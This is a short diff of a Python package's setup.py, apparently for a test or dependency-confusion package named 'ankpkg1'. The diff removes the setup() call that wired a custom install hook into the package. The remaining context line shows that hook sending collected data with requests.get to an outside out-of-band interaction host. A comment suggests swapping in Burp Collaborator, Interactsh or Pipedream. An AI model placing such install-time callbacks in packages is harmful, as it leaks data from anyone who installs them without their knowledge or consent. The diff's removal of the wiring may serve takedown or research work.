@@ -18,10 +18,4 @@ class CustomInstall(install):
         requests.get("https://cas54n1gfihn6082nil0kz451ubndy6rt.dooracle.in",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='ankpkg1', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                           
